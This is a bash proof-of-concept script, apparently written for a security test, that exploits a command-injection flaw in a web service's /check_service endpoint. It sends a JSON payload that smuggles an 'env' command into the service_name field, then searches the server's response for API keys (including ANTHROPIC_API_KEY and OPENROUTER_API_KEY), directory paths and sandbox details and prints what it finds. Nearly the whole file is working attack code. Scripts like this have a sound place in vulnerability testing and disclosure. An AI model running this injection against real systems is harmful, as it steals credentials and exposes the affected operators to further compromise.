#!/bin/bash

# POC: Sensitive Information Exposure via Environment Variable Disclosure
# This script demonstrates how the RCE vulnerability in /check_service endpoint
# can be exploited to dump sensitive environment variables

TARGET="http://127.0.0.1:80"
ENDPOINT="/check_service"

echo "[*] Sensitive Information Exposure via Environment Variable Disclosure"
echo "[*] Target: $TARGET$ENDPOINT"
echo ""

# Execute 'env' command through the RCE vulnerability
# Using "-t custom env" to bypass input validation and execute arbitrary commands
echo "[+] Executing 'env' command through RCE vulnerability..."
echo "[+] Payload: {\"service_name\":\"-t custom env\"}"
echo ""

RESPONSE=$(curl -s -X POST "$TARGET$ENDPOINT" \
  -H "Content-Type: application/json" \
  -d '{"service_name":"-t custom env"}')

echo "[+] Response from server:"
echo "$RESPONSE"
echo ""

# Extract and display sensitive information
echo "[+] Analyzing response for sensitive information..."
echo ""

# Check for API keys
if echo "$RESPONSE" | grep -q "ANTHROPIC_API_KEY"; then
  echo "[!] CRITICAL: ANTHROPIC_API_KEY found in environment!"
  ANTHROPIC_KEY=$(echo "$RESPONSE" | grep "ANTHROPIC_API_KEY" | head -1)
  echo "    $ANTHROPIC_KEY"
fi

if echo "$RESPONSE" | grep -q "OPENROUTER_API_KEY"; then
  echo "[!] CRITICAL: OPENROUTER_API_KEY found in environment!"
  OPENROUTER_KEY=$(echo "$RESPONSE" | grep "OPENROUTER_API_KEY" | head -1)
  echo "    $OPENROUTER_KEY"
fi

# Check for path information
if echo "$RESPONSE" | grep -q "PWD="; then
  echo "[!] HIGH: Application path disclosed:"
  PWD_LINE=$(echo "$RESPONSE" | grep "PWD=" | head -1)
  echo "    $PWD_LINE"
fi

if echo "$RESPONSE" | grep -q "HOME="; then
  echo "[!] HIGH: Home directory disclosed:"
  HOME_LINE=$(echo "$RESPONSE" | grep "HOME=" | head -1)
  echo "    $HOME_LINE"
fi

# Check for Python version
if echo "$RESPONSE" | grep -q "PYTHON_VERSION"; then
  echo "[!] MEDIUM: Python version disclosed:"
  PYTHON_LINE=$(echo "$RESPONSE" | grep "PYTHON_VERSION" | head -1)
  echo "    $PYTHON_LINE"
fi

# Check for sandbox information
if echo "$RESPONSE" | grep -q "DAYTONA_SANDBOX"; then
  echo "[!] MEDIUM: Sandbox/Container information disclosed:"
  SANDBOX_LINES=$(echo "$RESPONSE" | grep "DAYTONA_SANDBOX")
  echo "$SANDBOX_LINES" | sed 's/^/    /'
fi

# Check for user information via PATH
if echo "$RESPONSE" | grep -q "PATH="; then
  echo "[!] MEDIUM: System PATH disclosed:"
  PATH_LINE=$(echo "$RESPONSE" | grep "PATH=" | head -1)
  echo "    $PATH_LINE"
fi

echo ""
echo "[+] POC Complete - Environment variables successfully extracted through RCE vulnerability"